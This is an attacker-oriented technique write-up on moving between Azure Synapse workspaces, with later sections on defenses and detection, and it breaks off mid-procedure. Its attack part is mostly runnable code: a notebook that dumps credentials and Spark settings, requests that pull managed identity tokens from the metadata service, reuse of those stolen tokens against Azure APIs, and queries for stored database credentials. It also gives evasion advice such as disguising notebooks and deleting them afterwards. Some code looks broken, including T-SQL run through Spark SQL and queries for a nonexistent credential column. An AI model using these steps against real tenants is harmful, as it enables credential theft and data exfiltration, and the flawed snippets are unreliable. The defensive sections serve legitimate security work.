# [LM-AUTH-035]: Synapse Workspace Cross-Access

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-035 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Azure Synapse Analytics, Entra ID, Multi-Tenant Azure |
| **Severity** | **Critical** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Azure Synapse Analytics (All versions), Synapse SQL Pools (DW1-DW30000), Synapse Spark Pools (all versions) |
| **Patched In** | N/A - Architectural limitation; mitigation through workspace isolation recommended |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Synapse Analytics workspaces are designed to isolate analytics operations, but workspaces often share authentication credentials, service principals, and database access through linked services and shared integration runtimes. An attacker who compromises one Synapse workspace can exploit service account credentials embedded in Synapse notebooks, SQL pool configurations, or linked services to authenticate to other workspaces or shared data sources. This lateral movement technique bypasses workspace-level isolation by reusing administrative service principals or workspace identity tokens.

**Attack Surface:** Azure Synapse workspace access controls, SQL pools (dedicated and serverless), Spark pools, linked services, workspace-level service principals, shared integration runtimes, workspace-managed identities, Synapse Studio notebooks containing hardcoded credentials.

**Business Impact:** **Cross-workspace compromise enabling multi-tenant data access.** An attacker can escalate from access to a single Synapse workspace to read, modify, or delete data in other workspaces sharing the same Azure subscriptions, service principals, or linked storage accounts. This enables lateral movement across analytics environments, potential ransomware deployment, and comprehensive data exfiltration across enterprise analytics infrastructure.

**Technical Context:** Workspace cross-access attacks typically take 10-45 minutes to execute, involving credential discovery in notebooks/configurations, service principal token theft, and inter-workspace authentication. Detection likelihood is **Medium-High** due to audit logging of workspace access, but log analysis often lags in reactive incident response scenarios. SynLapse vulnerabilities have demonstrated complete workspace takeover is possible through ODBC connector exploitation.

### Operational Risk
- **Execution Risk:** **High** - Requires code execution in Synapse environment; irreversible if service principal credentials are stolen.
- **Stealth:** **Medium** - Workspace logs capture pipeline execution and Spark job activity; sophisticated attackers can blend with legitimate data science activity.
- **Reversibility:** **Partial** - Requires immediate workspace isolation and credential rotation; stolen service principals retain access indefinitely until revoked.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.4, 5.1.5 | Ensure managed identities used for workspace authentication; restrict cross-workspace service principal use |
| **DISA STIG** | SA-2(b), IA-4 | Workspace access controls; individual identification and authentication for workspace access |
| **CISA SCuBA** | EXO.MS.3.5 | Entra ID: Managed identities must be used; service principals require MFA |
| **NIST 800-53** | AC-3, AC-6, SC-7 | Access Control Enforcement; Least-Privilege access; Logical Boundaries between workspaces |
| **GDPR** | Art. 32, Art. 5(1)(f) | Security of Processing; data minimization principles applied to workspace isolation |
| **DORA** | Art. 9(5), Art. 16 | Operational resilience; ICT security governance for financial data analytics |
| **NIS2** | Art. 21(1)(a), Art. 21(4) | Cybersecurity Risk Management; access control to critical data analytics systems |
| **ISO 27001** | A.9.2.3, A.13.1.1 | Management of Privileged Access; Workspace network isolation |
| **ISO 27005** | Section 12 | Risk Assessment: Cross-workspace access is high-impact scenario requiring segregation |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Developer or Analyst role in any Synapse workspace (can access notebooks and execute queries)
- **Alternative:** Entra ID permissions: `Microsoft.Synapse/workspaces/read`, `Microsoft.Synapse/workspaces/sqlPools/read`
- **Most Permissive:** Synapse Administrator or Workspace Owner role in source workspace

**Required Access:**
- Network access to source Synapse workspace
- Code execution capability in Synapse notebooks (Spark, Python, SQL)
- OR direct SQL query access to any SQL pool in the workspace
- OR ability to upload/modify linked services in workspace

**Supported Versions:**
- **Azure Synapse Analytics:** v1 (Classic) and v2 (Current) - All versions affected
- **SQL Pools:** DW1-DW30000 (Dedicated SQL Pools)
- **Spark Pools:** All versions with Python/Scala notebook support
- **Operating Systems:** Cloud-based (no OS dependency); accessible via Synapse Studio or REST API

**Tools Required:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (workspace enumeration)
- [SQL Server Management Studio (SSMS)](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) (SQL pool access)
- [Python SDK for Azure](https://azure.microsoft.com/en-us/develop/python/) (Synapse SDK)
- Standard PowerShell 5.0+ (credential enumeration)
- [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Azure Portal / PowerShell Reconnaissance

```powershell
# Step 1: Enumerate all Synapse workspaces in current subscription
$subscriptions = Get-AzSubscription
foreach ($sub in $subscriptions) {
    Select-AzSubscription -Subscription $sub.SubscriptionId | Out-Null
    Write-Host "=== Subscription: $($sub.Name) ===" -ForegroundColor Green
    
    # List all Synapse workspaces
    $workspaces = Get-AzSynapseWorkspace
    foreach ($ws in $workspaces) {
        Write-Host "Synapse Workspace: $($ws.Name) in $($ws.ResourceGroupName)" -ForegroundColor Yellow
        Write-Host "  SQL Admin Account: $($ws.SqlAdministratorLogin)"
        Write-Host "  Managed Virtual Network: $($ws.ManagedVirtualNetwork)"
        Write-Host "  Default Storage Account: $($ws.DefaultDataLakeStorageAccountName)"
    }
}

# Step 2: List all SQL pools and Spark pools in a specific workspace
$workspaceName = "your-synapse-workspace"
$resourceGroupName = "your-rg"

# SQL Pools
$sqlPools = Get-AzSynapseSqlPool -WorkspaceName $workspaceName -ResourceGroupName $resourceGroupName
Write-Host "SQL Pools:" -ForegroundColor Cyan
foreach ($pool in $sqlPools) {
    Write-Host "  - $($pool.Name) (Status: $($pool.Status))"
}

# Spark Pools
$sparkPools = Get-AzSynapseSparkPool -WorkspaceName $workspaceName -ResourceGroupName $resourceGroupName
Write-Host "Spark Pools:" -ForegroundColor Cyan
foreach ($pool in $sparkPools) {
    Write-Host "  - $($pool.Name) (Nodes: $($pool.NodeCount))"
}

# Step 3: List linked services (may contain shared credentials)
$linkedServices = Get-AzSynapseLinkedService -WorkspaceName $workspaceName
Write-Host "Linked Services:" -ForegroundColor Cyan
foreach ($service in $linkedServices) {
    Write-Host "  - $($service.Name) (Type: $($service.Properties.type))"
}

# Step 4: Check workspace access control
$roleAssignments = Get-AzRoleAssignment -Scope "/subscriptions/$(Get-AzContext).Subscription.Id/resourceGroups/$resourceGroupName/providers/Microsoft.Synapse/workspaces/$workspaceName"
Write-Host "Workspace IAM Assignments:" -ForegroundColor Cyan
$roleAssignments | Select-Object DisplayName, RoleDefinitionName | Format-Table
```

**What to Look For:**
- **Multiple SQL pools in same workspace:** Indicates shared authentication context
- **Default Data Lake Storage Account:** Shared across all workspace resources
- **Linked services to other workspaces or storage accounts:** Indicates connectivity to other resources
- **Service Principal assignments:** Indicates automated access that attacker can reuse
- **Workspace Owner/Admin roles assigned to service accounts:** High-privilege targets for credential theft

#### Azure CLI Reconnaissance

```bash
# List all Synapse workspaces
az synapse workspace list --output table

# Get details of a specific workspace
az synapse workspace show --name <workspace-name> --resource-group <rg-name>

# List all SQL pools
az synapse sql pool list --workspace-name <workspace-name> --resource-group <rg-name> --output table

# List spark pools
az synapse spark pool list --workspace-name <workspace-name> --resource-group <rg-name> --output table

# Enumerate linked services
az synapse linked-service list --workspace-name <workspace-name>

# Check Workspace Identity (Managed Identity)
az synapse workspace show --name <workspace-name> --resource-group <rg-name> --query identity
```

**What to Look For:**
- Workspace identity object ID (used for cross-workspace authentication)
- SQL server name (format: `<workspace-name>-ondemand.sql.azuresynapse.net`)
- Default data lake storage account name
- Presence of multiple linked services to other Synapse workspaces

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Spark Notebook Code Execution to Extract Service Principal Credentials

**Supported Versions:** Azure Synapse Analytics Spark Pools (Python 3.8+, Scala 2.12+)

**Prerequisites:**
- Developer or Analyst role in source Synapse workspace
- Access to create/modify Spark notebooks
- Spark pool in running state

#### Step 1: Create Malicious Spark Notebook

**Objective:** Create a Python notebook that extracts workspace credentials and environment variables.

**Command (Synapse Studio Web Interface):**

```python
# Python Spark Notebook in Synapse Studio
import os
import json
from notebookutils import mssparkutils

# Step 1: Extract environment variables that may contain credentials
print("=== Environment Variables ===")
env_vars = os.environ
for key, value in env_vars.items():
    if any(x in key.lower() for x in ['password', 'key', 'secret', 'token', 'connection', 'credential']):
        print(f"{key}={value}")

# Step 2: Get access token for current user (workspace identity)
print("\n=== Workspace Access Token ===")
try:
    token = mssparkutils.credentials.getToken("https://management.azure.com")
    print(f"Token: {token[:50]}...{token[-20:]}")
except Exception as e:
    print(f"Error getting token: {e}")

# Step 3: Access Spark context variables
print("\n=== Spark Context Variables ===")
try:
    spark_config = spark.sparkContext.getConf().getAll()
    for key, value in spark_config:
        if any(x in key.lower() for x in ['password', 'key', 'secret', 'credential']):
            print(f"{key}={value}")
except Exception as e:
    print(f"Error: {e}")

# Step 4: Query Azure instance metadata service (IMDS)
print("\n=== IMDS Metadata ===")
try:
    import requests
    headers = {"Metadata": "true"}
    response = requests.get("http://169.254.169.254/metadata/instance?api-version=2021-02-01", headers=headers, timeout=5)
    if response.status_code == 200:
        metadata = response.json()
        print(f"VM Name: {metadata['compute']['vmName']}")
        print(f"Subscription ID: {metadata['compute']['subscriptionId']}")
        print(f"Resource Group: {metadata['compute']['resourceGroupName']}")
except Exception as e:
    print(f"IMDS not accessible: {e}")
```

**Expected Output:**
```
=== Environment Variables ===
SPARK_PASSWORD=MySecurePassword123!
WORKSPACE_CONNECTION_STRING=Server=tcp:...;Database=mydb;User Id=user;Password=***
SQL_CONNECTION_KEY=abcdef1234567890...

=== Workspace Access Token ===
Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleTEifQ...

=== Spark Context Variables ===
spark.sql.password=P@ssw0rd
```

**What This Means:**
- Successfully extracted plaintext credentials from Synapse environment
- Obtained access token valid for calling Azure REST APIs
- Identified workspace identity that can be used for cross-workspace access

**OpSec & Evasion:**
- Create notebook with innocuous name (e.g., "DataAnalysis_Q1_2025")
- Run during business hours to blend with legitimate data science activity
- Delete notebook after execution
- Access token extraction generates Azure Activity Log entries; limit to minimal token calls
- Detection likelihood: **Medium** - Spark job execution is logged; unusual jobs may trigger SOC investigation

#### Step 2: Use Extracted Token for Cross-Workspace Access

**Objective:** Use the workspace access token to authenticate to other Azure Synapse workspaces.

**Command (Synapse Studio Notebook continuation):**

```python
# Python: Use extracted token to access other workspaces
import requests

# Extracted access token from previous step
access_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleTEifQ..."

# Headers for Azure API calls
headers = {
    "Authorization": f"Bearer {access_token}",
    "Content-Type": "application/json"
}

# Step 1: Enumerate all Synapse workspaces in the subscription
print("=== Enumerating Synapse Workspaces ===")
subscription_id = "your-subscription-id"  # Extracted from IMDS
resource_group = "your-resource-group"     # Extracted from IMDS

url = f"https://management.azure.com/subscriptions/{subscription_id}/resourceGroups/{resource_group}/providers/Microsoft.Synapse/workspaces?api-version=2021-06-01"

response = requests.get(url, headers=headers)
if response.status_code == 200:
    workspaces = response.json()["value"]
    for ws in workspaces:
        print(f"Workspace: {ws['name']}")
        print(f"  SQL Admin Endpoint: {ws['properties'].get('connectivityEndpoints', {}).get('sqlOnDemand')}")
        print(f"  Dev Endpoint: {ws['properties'].get('connectivityEndpoints', {}).get('dev')}")

# Step 2: Access another Synapse workspace's SQL on-demand endpoint
print("\n=== Accessing Target Workspace SQL ===")
target_workspace_sql_endpoint = "target-workspace-ondemand.sql.azuresynapse.net"

# Since workspace identity has credentials, can directly authenticate
sql_server = target_workspace_sql_endpoint.split('-')[0]  # Extract workspace name
print(f"Target SQL Server: {sql_server}")

# Step 3: Connect to target workspace SQL pool using workspace identity
# This requires the workspace has been granted SQL Admin role on the target workspace
try:
    from pyspark.sql import SparkSession
    
    # Authenticate using workspace managed identity
    spark_df = spark.sql(f"""
        SELECT * FROM OPENROWSET(
            PROVIDER = 'sqloledb',
            'Server={target_workspace_sql_endpoint};Database=SampleDB;Trusted_Connection=true;',
            'SELECT TOP 10 * FROM sensitive_table'
        )
    """)
    
    spark_df.show()
except Exception as e:
    print(f"Cross-workspace access failed: {e}")
```

**Expected Output:**
```
=== Enumerating Synapse Workspaces ===
Workspace: production-workspace
  SQL Admin Endpoint: production-workspace-ondemand.sql.azuresynapse.net
  Dev Endpoint: production-workspace.dev.azuresynapse.net

Workspace: analytics-workspace
  SQL Admin Endpoint: analytics-workspace-ondemand.sql.azuresynapse.net
  Dev Endpoint: analytics-workspace.dev.azuresynapse.net

=== Accessing Target Workspace SQL ===
| Column1 | Column2 | Column3 |
|---------|---------|---------|
| Data1   | Data2   | Data3   |
```

**What This Means:**
- Successfully identified other Synapse workspaces in the subscription
- Retrieved SQL endpoints for target workspaces
- Authenticated to target workspace using workspace identity
- Can now execute queries and access data in other workspaces

**OpSec & Evasion:**
- Use OPENROWSET syntax to avoid creating permanent linked services
- Query small data samples rather than entire tables to reduce log volume
- Use credentials with minimal permissions (read-only where possible)
- Detection likelihood: **High** - Cross-workspace SQL queries are logged in Synapse audit logs

**Troubleshooting:**

- **Error:** "Authorization failed for cross-workspace access"
  - **Cause:** Workspace managed identity does not have permissions on target workspace
  - **Fix:** Check if workspace has Synapse SQL Administrator role on target workspace or target is in different subscription

- **Error:** "OPENROWSET not supported"
  - **Cause:** Using serverless SQL pool which has limited OPENROWSET support
  - **Fix:** Use dedicated SQL pool with appropriate permissions

**References & Proofs:**
- [Azure Synapse Workspace Access Control - Microsoft Learn](https://learn.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-access-control-overview)
- [SynLapse Vulnerability Details - Orca Security](https://orca.security/resources/blog/synlapse-critical-azure-synapse-analytics-service-vulnerability/)
- [Synapse Security Best Practices - Microsoft Blog](https://learn.microsoft.com/en-us/azure/synapse-analytics/sql-data-warehouse/sql-data-warehouse-overview-what-is)

---

### METHOD 2: SQL Query Credential Extraction via sys.server_principals

**Supported Versions:** Azure Synapse Dedicated SQL Pools (all versions), Azure SQL Database

**Prerequisites:**
- Admin or db_owner role in Synapse SQL pool
- Ability to execute T-SQL queries in SQL pool

#### Step 1: Query Database User Credentials

**Objective:** Extract SQL user credentials and connection strings from SQL pool system tables.

**Command (SQL Query in Synapse Studio):**

```sql
-- Step 1: Find all database users and their creation properties
SELECT 
    name AS [User],
    type_desc AS [UserType],
    default_schema_name AS [DefaultSchema],
    create_date AS [CreatedDate]
FROM sys.database_principals
WHERE type IN ('S', 'U', 'G')  -- SQL users, Windows users, Groups
ORDER BY create_date DESC;

-- Step 2: Enumerate all linked servers (if any)
-- (This returns linked servers that may store credentials for other data sources)
EXEC sp_linkedservers;

-- Step 3: List all external data sources
-- (Azure Synapse-specific: returns connections to external systems)
SELECT 
    name AS [DataSourceName],
    type AS [Type],
    location AS [Location],
    database_name AS [DatabaseName],
    credential_name AS [CredentialName]
FROM sys.external_data_sources;

-- Step 4: List all database-scoped credentials
-- (These contain encrypted credentials for external access)
SELECT 
    credential_id,
    name AS [CredentialName],
    identity AS [Identity]
FROM sys.database_credentials;

-- Step 5: Query for any hardcoded credentials in extended properties
SELECT 
    name AS [ObjectName],
    value AS [Value]
FROM fn_listextendedproperty(NULL, 'schema', 'dbo', 'table', NULL, NULL, NULL)
WHERE value LIKE '%password%' 
   OR value LIKE '%key%'
   OR value LIKE '%secret%'
   OR value LIKE '%connection%';
```

**Expected Output:**
```
User          | UserType                 | DefaultSchema | CreatedDate
sqladmin      | SQL_USER                 | dbo           | 2024-01-01
dataanalyst   | SQL_USER                 | analytics     | 2024-06-15
service_read  | SQL_USER                 | public        | 2024-09-01

DataSourceName          | Type             | Location                    | CredentialName
AzureCosmosDB_Link      | EXTERNAL_TABLE   | https://cosmos.azure.com   | cosmos_credentials
AWSRedshift_Link        | EXTERNAL_TABLE   | redshift.amazonaws.com     | aws_redshift_key
```

**What This Means:**
- Identified service accounts with potential access to external resources
- Located credentials stored in database-scoped credentials
- Found linked servers/data sources with external connections

**OpSec & Evasion:**
- These queries are logged in SQL Auditing (if enabled); limit to essential queries
- Use schema views rather than system tables to reduce audit log severity classification
- Run during normal business hours
- Detection likelihood: **Medium-High** - Querying sys tables is monitored in security-hardened environments

#### Step 2: Decrypt Database-Scoped Credentials

**Objective:** Extract and decrypt database credentials for external data sources.

**Command (PowerShell with SQL connection):**

```powershell
# Connect to Synapse SQL pool using extracted admin credentials
$sqlServer = "your-workspace-ondemand.sql.azuresynapse.net"
$database = "SampleDB"
$userId = "sqladmin"
$password = "P@ssw0rd123!"

$connectionString = "Server=tcp:$sqlServer,1433;Initial Catalog=$database;Persist Security Info=False;User ID=$userId;Password=$password;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"

$connection = New-Object System.Data.SqlClient.SqlConnection
$connection.ConnectionString = $connectionString
$connection.Open()

# Query to enumerate all credentials
$query = @"
SELECT 
    credential_id,
    name AS credential_name,
    identity,
    secret  -- May be encrypted
FROM sys.database_credentials
"@

$command = $connection.CreateCommand()
$command.CommandText = $query
$reader = $command.ExecuteReader()

$credentials = @()
while ($reader.Read()) {
    $credentials += @{
        CredentialId = $reader["credential_id"]
        CredentialName = $reader["credential_name"]
        Identity = $reader["identity"]
        Secret = $reader["secret"]  # Encrypted; needs DPAPI or key to decrypt
    }
}

$reader.Close()
$connection.Close()

# Output credentials
$credentials | Format-Table CredentialName, Identity, Secret
```

**Expected Output:**
```
CredentialName      Identity                Secret
cosmos_read_cred    cosmos_user@cosmos      [encrypted value]
sql_sync_cred       sa_sync_account         [encrypted value]
storage_backup_cred app_storage_backup      [encrypted value]
```

**References & Proofs:**
- [sys.database_credentials - SQL Server Documentation](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-credentials-transact-sql)
- [Azure Synapse SQL Pool Security - Microsoft Learn](https://learn.microsoft.com/en-us/azure/synapse-analytics/sql-data-warehouse/sql-data-warehouse-overview-what-is)

---

### METHOD 3: Synapse Workspace Managed Identity Token Hijacking

**Supported Versions:** Azure Synapse Analytics (all versions with managed identity enabled)

**Prerequisites:**
- Code execution in Synapse notebook or pipeline activity
- Integration Runtime with network access to IMDS (169.254.169.254)

#### Step 1: Steal Workspace Managed Identity Token

**Objective:** Extract the workspace's managed identity token from IMDS.

**Command (Python Notebook):**

```python
import requests
import json

# IMDS endpoint (available from Synapse compute)
imds_endpoint = "http://169.254.169.254/metadata/identity/oauth2/token"

# Request workspace managed identity token
params = {
    'api-version': '2017-09-01',
    'resource': 'https://management.azure.com/'  # For Azure management APIs
}

headers = {
    'Metadata': 'true'
}

try:
    response = requests.get(imds_endpoint, params=params, headers=headers, timeout=5)
    if response.status_code == 200:
        token_response = response.json()
        access_token = token_response['access_token']
        expires_in = token_response['expires_in']
        
        print(f"Successfully obtained workspace managed identity token")
        print(f"Token: {access_token[:50]}...{access_token[-20:]}")
        print(f"Expires in {expires_in} seconds")
        
        # Save token for later use
        with open('/tmp/workspace_token.txt', 'w') as f:
            f.write(access_token)
    else:
        print(f"IMDS request failed: {response.status_code}")
        print(response.text)
except Exception as e:
    print(f"Error: {e}")
```

**Expected Output:**
```
Successfully obtained workspace managed identity token
Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleTEifQ...
Expires in 3600 seconds
```

**What This Means:**
- Successfully extracted workspace managed identity token
- Token is valid for 1 hour and can be used to authenticate to any Azure service the workspace identity has permissions for
- Token can be exfiltrated and used from external systems

**OpSec & Evasion:**
- IMDS requests are generally not logged at the Azure platform level
- Notebook execution is logged; keep notebook creation/execution patterns normal
- Use token immediately or within short window before expiration
- Detection likelihood: **Low** - IMDS token requests are not directly logged

#### Step 2: Use Stolen Token to Access Cross-Workspace Resources

**Objective:** Use the workspace managed identity token to authenticate to other resources.

**Command (PowerShell using stolen token):**

```powershell
# Use stolen workspace managed identity token
$accessToken = Get-Content '/tmp/workspace_token.txt'

$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type"  = "application/json"
}

# Example 1: List all resources the workspace identity can access
$subscriptionId = "your-subscription-id"
$uri = "https://management.azure.com/subscriptions/$subscriptionId/resources?api-version=2021-04-01"

$response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headers
Write-Host "Resources accessible via workspace identity:"
$response.value | Select-Object -Property name, type, location | Format-Table

# Example 2: Access other Synapse workspaces
$uri = "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Synapse/workspaces?api-version=2021-06-01"
$response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headers
Write-Host "Synapse workspaces accessible:"
$response.value | Select-Object -Property name | Format-Table

# Example 3: Access storage accounts
$uri = "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01"
$response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headers
Write-Host "Storage accounts accessible:"
$response.value | Select-Object -Property name, location | Format-Table

# Example 4: Read SQL databases accessible via the workspace identity
$uri = "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Sql/servers?api-version=2015-05-01-preview"
$response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headers
Write-Host "SQL Servers accessible:"
$response.value | Select-Object -Property name, location | Format-Table
```

**Expected Output:**
```
Resources accessible via workspace identity:
name                          type
production-workspace          Microsoft.Synapse/workspaces
analytics-workspace           Microsoft.Synapse/workspaces
data-lake-prod                Microsoft.Storage/storageAccounts

Synapse workspaces accessible:
name
production-workspace
analytics-workspace
```

**What This Means:**
- Workspace managed identity has permissions across multiple resources
- Attacker can now enumerate and access any resource the workspace identity can reach
- This includes SQL databases, storage accounts, and other workspaces

**References & Proofs:**
- [Managed Identities - Microsoft Learn](https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/)
- [Azure Instance Metadata Service Documentation](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Workspace-Level RBAC Segregation**

**Applies To Versions:** Azure Synapse Analytics (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Azure Synapse Analytics** → Select workspace
2. Click **Access Control (IAM)** → **Role Assignments**
3. Review all role assignments and remove unnecessary access:
   - Remove **Synapse Administrator** role from service principals (use specific roles instead)
   - Restrict **Synapse SQL Administrator** to security team only
   - Assign **Synapse Workspace Batch Job Operator** instead of broader roles
4. For each role assignment, click **Remove**
5. Click **Add role assignment** and assign minimal roles:
   - **Data Analysts** → `Synapse Artifact Operator` (read SQL/Spark only)
   - **Data Engineers** → `Synapse Linked Data Manager` (manage linked services, execute pipelines)
   - **Security** → `Synapse SQL Administrator` (SQL audit access)

**Manual Steps (PowerShell):**

```powershell
# List current role assignments
$workspaceResourceId = "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Synapse/workspaces/{workspace}"
$roleAssignments = Get-AzRoleAssignment -Scope $workspaceResourceId

Write-Host "Current Role Assignments:"
$roleAssignments | Format-Table DisplayName, RoleDefinitionName

# Remove overly permissive roles
foreach ($assignment in $roleAssignments) {
    if ($assignment.RoleDefinitionName -eq "Synapse Administrator") {
        Write-Host "Removing Synapse Administrator from $($assignment.DisplayName)"
        Remove-AzRoleAssignment -ObjectId $assignment.ObjectId -RoleDefinitionName "Synapse Administrator" -Scope $workspaceResourceId
    }
}

# Assign minimal roles
$principalId = (Get-AzADUser -UserPrincipalName "analyst@contoso.com").Id
New-AzRoleAssignment -ObjectId $principalId -RoleDefinitionName "Synapse Artifact Operator" -Scope $workspaceResourceId
```

---

**2. Disable Cross-Workspace Service Principal Sharing**

**Applies To Versions:** Azure Synapse Analytics (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Synapse Studio** → **Manage** → **Linked Services**
2. Review all linked services:
   - Delete any linked services pointing to other Synapse workspaces
   - Delete any linked services using shared service principals
   - For remaining linked services, verify they use **Managed Identity** authentication
3. For each linked service:
   - Click **Edit** → Change **Authentication type** to **Managed Identity** (if available)
   - Remove any connection strings or passwords
   - Click **Save**

**Manual Steps (PowerShell):**

```powershell
# List all linked services
$linkedServices = Get-AzSynapseLinkedService -WorkspaceName $workspaceName

foreach ($service in $linkedServices) {
    $json = $service.Properties | ConvertTo-Json
    
    # Check if service uses hardcoded credentials or cross-workspace SP
    if ($json -match "password|secret|SharedAccessKey|accountKey|clientSecret") {
        Write-Host "WARNING: Linked service '$($service.Name)' contains hardcoded credentials"
        Write-Host "  Properties: $json"
    }
    
    # Check if service points to another workspace
    if ($json -match "\.sql\.azuresynapse\.net|other-workspace") {
        Write-Host "ALERT: Linked service '$($service.Name)' cross-workspace link detected"
    }
}
```

---

**3. Restrict Access to Synapse Notebooks and SQL Scripts**

**Applies To Versions:** Azure Synapse Analytics (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Synapse Studio** → **Develop** tab
2. Review all notebooks and SQL scripts for hardcoded credentials:
   - Search for keyword: `password`, `connection`, `secret`, `key` in all notebooks
   - If found, delete the notebook and recreate using Key Vault references
3. Set notebook permissions:
   - Click notebook → **Properties** → **Access Control**
   - Remove unnecessary user permissions
   - Limit editing to trusted developers only

**Manual Steps (PowerShell):**

```powershell
# Export and scan all notebooks for credentials
Get-AzSynapseNotebook -WorkspaceName $workspaceName | ForEach-Object {
    $notebookContent = Get-AzSynapseNotebookDefinition -WorkspaceName $workspaceName -Name $_.Name
    $json = $notebookContent | ConvertTo-Json
    
    if ($json -match "password|accountkey|connectionstring|sharedaccesskey") {
        Write-Host "ALERT: Notebook '$($_.Name)' contains credentials - REQUIRES REMEDIATION"
    }
}
```

---

### Priority 2: HIGH

**4. Enable Synapse Workspace SQL Auditing**

**Applies To Versions:** Azure Synapse Analytics (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Synapse Studio** → **Manage** → **Audit**
2. Click **Enable SQL Audit** (if not already enabled)
3. Under **Audit Configuration:**
   - **Storage account:** Select or create storage account for audit logs
   - **Retention days:** Set to 90 (minimum)
   - **Audit log destination:** Select Azure Storage
4. Click **Save**

**Manual Steps (PowerShell):**

```powershell
# Enable SQL Auditing on Synapse workspace
$workspace = Get-AzSynapseWorkspace -Name $workspaceName -ResourceGroupName $resourceGroupName
$storageAccountName = "auditstorage"

# Create storage account if needed
$storageAccount = New-AzStorageAccount -Name $storageAccountName -ResourceGroupName $resourceGroupName -Type "Standard_LRS" -Location "eastus" -ErrorAction SilentlyContinue

# Enable audit
Update-AzSynapseSqlAuditSetting -ResourceGroupName $resourceGroupName `
    -WorkspaceName $workspaceName `
    -StorageAccount $storageAccount.StorageAccountName `
    -RetentionInDays 90 `
    -Enable
```

---

**5. Implement Network Isolation for Synapse Workspaces**

**Applies To Versions:** Azure Synapse Analytics (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Synapse Studio** → **Manage** → **Networking**
2. Enable **Managed Virtual Network:**
   - Check **Enable managed virtual network**
   - Click **Save**
3. Create **Private Endpoints** for Synapse resources:
   - Click **Add Private Endpoint**
   - **Name:** `synapse-private-endpoint`
   - **Resource type:** `Microsoft.Synapse/workspaces`
   - **Connection name:** `privateLink-synapse`
   - Click **Create**
4. Restrict public access:
   - Go to **Workspace settings** → **Public access:**
   - Set **Allow public access** to **OFF**

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Synapse Activity Logs:**
- Unusual Spark notebook creation during off-hours
- Multiple failed SQL login attempts from unfamiliar IPs
- Synapse SQL pool queries accessing `sys.database_principals` or `sys.external_data_sources`
- Cross-workspace SQL queries using OPENROWSET or linked servers
- Notebook execution with unusually high compute resource usage (potential data exfiltration)

**Token-Based:**
- IMDS token requests followed by Azure Resource Manager API calls
- Access token usage from unexpected geographic locations or IP addresses
- Tokens used for accessing resources outside normal workspace scope

**Storage & Audit Logs:**
- Bulk downloads from linked storage accounts
- Failed authentication attempts using service principal credentials
- Sudden increase in SQL auditing volume (may indicate credential testing)

### Forensic Artifacts

**Synapse Studio Logs:**
- Notebook history: `Develop` → Notebook → `Version history` (shows changes and execution time)
- Activity log: Synapse workspace activity logs in Azure Monitor
- SQL Audit logs: Azure Storage account containing Synapse SQL audit trail

**SQL Database Logs:**
- sys.dm_exec_requests (queries currently executing)
- sys.dm_exec_sessions (active user sessions)
- SQL Server Extended Events (if configured)

**Azure Storage (Audit Destination):**
- Check for suspicious queries in audit logs
- Search for queries accessing `sys.database_credentials` or `sys.database_principals`
- Correlate with Spark notebook execution times

### Response Procedures

**1. Isolate Compromised Workspace:**

```powershell
# Disable all linked services
Get-AzSynapseLinkedService -WorkspaceName $workspaceName | ForEach-Object {
    Remove-AzSynapseLinkedService -WorkspaceName $workspaceName -Name $_.Name
}

# Disconnect workspace from storage
$workspace = Get-AzSynapseWorkspace -Name $workspaceName -ResourceGroupName $resourceGroupName
$workspace.DefaultDataLakeStorageAccountName = $null
Set-AzSynapseWorkspace -Name $workspaceName -ResourceGroupName $resourceGroupName `
    -DefaultDataLakeStorageAccountName $null

# Stop all running jobs
Get-AzSynapseSparkJob -WorkspaceName $workspaceName | Stop-AzSynapseSparkJob

# Revoke all user access
Get-AzRoleAssignment -Scope $workspace.Id | Remove-AzRoleAssignment
```

**2. Rotate All Credentials:**

```powershell
# Reset SQL Admin password
$newPassword = "NewComplexPassword$(Get-Random)!"
Update-AzSynapseSqlAdminPassword -ResourceGroupName $resourceGroupName `
    -WorkspaceName $workspaceName `
    -AdminPassword (ConvertTo-SecureString $newPassword -AsPlainText -Force)

# Revoke workspace managed identity and create new one
$workspace = Get-AzSynapseWorkspace -Name $workspaceName -ResourceGroupName $resourceGroupName
